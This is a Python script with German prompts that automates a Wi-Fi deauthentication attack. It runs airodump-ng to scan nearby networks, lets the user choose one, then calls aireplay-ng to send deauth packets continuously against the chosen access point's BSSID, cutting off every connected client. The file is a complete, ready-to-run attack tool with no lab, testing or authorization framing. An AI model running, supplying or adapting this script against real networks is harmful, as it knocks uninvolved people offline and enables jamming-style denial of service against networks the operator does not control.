import subprocess
import os
import time

def get_networks():
    print("Suche nach Netzwerken... (STRG+C nach ca. 10 Sek. drücken)")
    # Erstellt eine temporäre CSV mit den gefundenen Netzwerken
    try:
        subprocess.run(["sudo", "airodump-ng", "--write", "scan", "--output-format", "csv", "wlan0mon"])
    except KeyboardInterrupt:
        pass

    networks = []
    if os.path.exists("scan-01.csv"):
        with open("scan-01.csv", "r") as f:
            lines = f.readlines()
            for line in lines:
                parts = line.split(",")
                if len(parts) > 13 and "BSSID" not in parts[0]:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    if bssid and essid:
                        networks.append({"bssid": bssid, "channel": channel, "essid": essid})
    return networks

def start_deauth(target_bssid, channel):
    print(f"Setze Kanal auf {channel}...")
    subprocess.run(["sudo", "iwconfig", "wlan0mon", "channel", channel])
    
    print(f"Starte Deauth-Angriff auf {target_bssid}. Drücke STRG+C zum Stoppen.")
    # Sendet kontinuierlich Deauth-Pakete
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_bssid, "wlan0mon"])

def main():
    if not os.geteuid() == 0:
        print("Bitte starte das Skript mit sudo!")
        return

    nets = get_networks()
    if not nets:
        print("Keine Netzwerke gefunden.")
        return

    print("\nVerfügbare Netzwerke:")
    for i, n in enumerate(nets[:10]): # Zeigt die ersten 10 an
        print(f"[{i+1}] ESSID: {n['essid']} | BSSID: {n['bssid']} | CH: {n['channel']}")

    choice = int(input("\nWähle eine Nummer (1-10): ")) - 1
    target = nets[choice]

    start_deauth(target['bssid'], target['channel'])

if __name__ == "__main__":
    main()